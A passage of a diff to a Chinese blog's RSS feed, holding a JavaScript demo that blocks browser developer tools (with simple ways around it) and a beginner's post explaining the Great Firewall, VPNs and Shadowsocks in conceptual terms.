+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;meta http&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;equiv&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt; content&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;text/html; charset=utf-8&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;/&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;/title&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;style type&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;/*禁止选中文字*/&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    body{ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;moz&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*火狐*/&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;webkit&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*webkit浏览器*/&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;ms&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*IE10*/&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;khtml&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; &lt;span style=&#34;color:#6272a4&#34;&gt;/*早期浏览器*/&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        user&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;select&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt; none; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/style&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;Test&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/p&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;script type&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//禁用右键（防止右键查看源代码） 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.oncontextmenu&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;;} 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//禁止任何键盘敲击事件（防止F12和shift+ctrl+i调起开发者工具） 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onkeydown &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onkeyup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onkeypress &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; () { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.event.returnValue &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; h &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerHeight,w&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerWidth; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.onresize &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; () { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (h&lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerHeight&lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt;w&lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.innerWidth){ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.close(); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;about:blank&amp;#34;&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;/*好吧，你的开发者工具是单独的窗口显示，不会改变原来网页的高度和宽度， 但是你只要修改页面元素我就重新加载一次数据,让你无法修改页面元素（不支持IE9以下浏览器）*/&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener){ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMCharacterDataModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMAttributeNameChanged&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMCharacterDataModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMElementNameChanged&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeInserted&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeInsertedIntoDocument&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeRemoved&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMNodeRemovedFromDocument&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;DOMSubtreeModified&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(){&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;window&lt;/span&gt;.location.reload();}, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/script&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/body&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;/html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;JavaScript 实现禁止打开控制台（右键/工具栏/F12/Shift+Ctrl+I）&lt;/p&gt;
+&lt;p&gt;判断浏览器的可视高度和可视宽度是否有改变，清奇的思路。&lt;/p&gt;
+&lt;p&gt;把开发者工具是单独的窗口显示就好。&lt;/p&gt;
+&lt;p&gt;还有，就是先造个本地网站的404页面，在那里把开发者工具打开，然后再回来。&lt;/p&gt;
+&lt;p&gt;还有可以试试：&lt;/p&gt;
+&lt;p&gt;ctrl+shift+i&lt;/p&gt;
+&lt;p&gt;ctrl+shift+j&lt;/p&gt;
+&lt;p&gt;ctrl+u&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>怎么ping不了</title>
+        <link>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</link>
+        <pubDate>Thu, 11 Nov 2021 03:32:29 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</guid>
+        <description>&lt;img src="https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/whynotping.jpg" alt="Featured image of post 怎么ping不了" /&gt;&lt;h1 id=&#34;前言&#34;&gt;前言
+&lt;/h1&gt;&lt;p&gt;关于为什么要取一个这么沙雕的名字是有原因的，是因为一个冬至的晚上我想用&lt;code&gt;hexo d&lt;/code&gt;来把更新的博客上传到github pages上去，然而很不巧的是它给我报了这样一个错误：&lt;/p&gt;
+&lt;p&gt;Error！！&lt;/p&gt;
+&lt;p&gt;好吧截图暂时复现不到了，它的意思大概是无法和github进行连接。明明挂了梯子，可以在谷歌上搜索东西，甚至把clash的全局代理打开了，为什么不能在windows终端里连接到github呢？于是我想确认一下这终端是不是真的连上了代理，就做了一件事情：ping google.com&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 269; 
+			flex-basis: 646px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z.png&#34; data-size=&#34;536x199&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z.png&#34;
+			width=&#34;536&#34;
+			height=&#34;199&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z_hu7871a386e4168688896864e0351ebfe5_14787_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z_hu7871a386e4168688896864e0351ebfe5_14787_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;HhCprvVJQkKbY4Z&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;HhCprvVJQkKbY4Z&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;md，然后我就开始想为什么ping不通google。&lt;/p&gt;
+&lt;h1 id=&#34;要说的话&#34;&gt;要说的话
+&lt;/h1&gt;&lt;p&gt;2021届安全组的成员们，注意啦！！！&lt;/p&gt;
+&lt;p&gt;可能大家以后学习安全的方向不尽相同，但是如果你在&lt;a class=&#34;link&#34; href=&#34;https://www.sec-wiki.com/skill/index&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;secwiki&lt;/a&gt;上查找过的话，可以发现有一条打造科学的工作环境，这其中就包括学会使用谷歌搜索。更何况现在，我认为这正在逐渐向基本的生活技能靠拢……不单单搜谷歌，查文献，steam社区，逛github这些也很有必要。&lt;/p&gt;
+&lt;p&gt;之前一直在用QQ浏览器，有的地方被坑惨了（真的，推荐大家一开始就用谷歌浏览器，特别是web方向）。换了之后界面简洁，而且hackbar这些插件也十分方便，最主要的是没啥大病，不会在该弹出下载的地方给你弹出404。&lt;/p&gt;
+&lt;p&gt;有什么好处？&lt;/p&gt;
+&lt;p&gt;可以访问真正的互联网，将你的信息接收范围面向世界。
+方便做很多事情。&lt;/p&gt;
+&lt;p&gt;当然，最重要的是注意分辨言论，自身安全，保护隐私，相信这点大家都明白，都可以做到，这也是对大家的信任。&lt;/p&gt;
+&lt;p&gt;最后，如果可以看 Youtube 视频，直接看&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=XKZM_AjCUr0&amp;amp;list=PLqybz7NWybwUgR-S6m78tfd-lV4sBvGFG&amp;amp;index=1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这个&lt;/a&gt;系列，我写的只能算简单概括吧。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;最后！！&lt;/strong&gt;
+所以文章里不会提及具体方式的哦，只是想简单普及一下，不想让大家像我之前一样迷迷糊糊的。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;why-not-一&#34;&gt;why not （一）
+&lt;/h1&gt;&lt;p&gt;墙墙是啥？&lt;/p&gt;
+&lt;p&gt;通过&lt;strong&gt;IP地址封锁&lt;/strong&gt;，&lt;strong&gt;端口阻断&lt;/strong&gt;，&lt;strong&gt;DNS劫持和污染&lt;/strong&gt;，&lt;strong&gt;关键字屏蔽&lt;/strong&gt; 等技术对认为不符合要求（可以搜下审查制度）的互联网国际出口传输内容，进行干扰、阻断、屏蔽。
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 202; 
+			flex-basis: 486px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3.jpg&#34; data-size=&#34;1363x672&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3.jpg&#34;
+			width=&#34;1363&#34;
+			height=&#34;672&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3_hucd40f92ee44ab54ccf4818a6ef68cf0d_110433_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3_hucd40f92ee44ab54ccf4818a6ef68cf0d_110433_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;why-can-一&#34;&gt;why can （一）
+&lt;/h1&gt;&lt;p&gt;接下来，是为什么又能在浏览器访问到谷歌。这里有两种原理。&lt;/p&gt;
+&lt;h2 id=&#34;1vpn&#34;&gt;1.VPN
+&lt;/h2&gt;&lt;p&gt;刚刚说了，墙墙屏蔽的是那些不符合审查制度的网站，如果我们连接一台墙墙认为合理的服务器，把它作为一层代理，去完成用户想要做的事情，最后再返回结果，不就可以了吗？不由得去想谁能干这样的事情，VPN呀（virtual private network）！&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 204; 
+			flex-basis: 491px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4.jpg&#34; data-size=&#34;1364x666&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4.jpg&#34;
+			width=&#34;1364&#34;
+			height=&#34;666&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4_huee8dd0466f2863b2743a3ce3b6674e9b_90707_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4_huee8dd0466f2863b2743a3ce3b6674e9b_90707_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;img&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;img&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;吼吼，看上去十分完美，但是……慢慢的，墙墙发现越来越多的流量都是先发送一个数据包请求和一个服务器建立加密连接，然后紧跟着一个代理请求，于是这种特征就被识别出来了，就寄了。（特征一被识别，提供 VPN 服务的服务器 IP 地址就会被封了）&lt;/p&gt;
+&lt;h2 id=&#34;2shadowsocks&#34;&gt;2.Shadowsocks
+&lt;/h2&gt;&lt;p&gt;接下来，一个更新的技术出现了，Shadowsocks（这既是一个技术的名字又是一类客户端的名字）。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 179; 
+			flex-basis: 430px&#34;
+	&gt;
+	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5.jpg&#34; data-size=&#34;1810x1009&#34;&gt;
+		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5.jpg&#34;
+			width=&#34;1810&#34;
+			height=&#34;1009&#34;
+			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5_hu56bf9ae0d2cdeb6aa88fc257edcd23a1_519710_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5_hu56bf9ae0d2cdeb6aa88fc257edcd23a1_519710_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;img&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;img&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Shadowsocks是将代理服务器拆开成Server端和client端，中间使用了socks网络传输协议。Socks 代理与应用层代理、 HTTP 层代理不同，Socks 代理只是简单地传递数据包，所以可以实现经过 墙墙量全部加密，从而消除明显的流量特征这个概念。&lt;/p&gt;
+&lt;h1 id=&#34;how一&#34;&gt;how（一）
+&lt;/h1&gt;&lt;p&gt;现在我们简单了解了墙墙 的大概工作思路，以及VPN和Shadowsocks的工作思路，我们再来看看理论上有几种方式实现。&lt;/p&gt;
+&lt;h2 id=&#34;软件方向&#34;&gt;软件方向
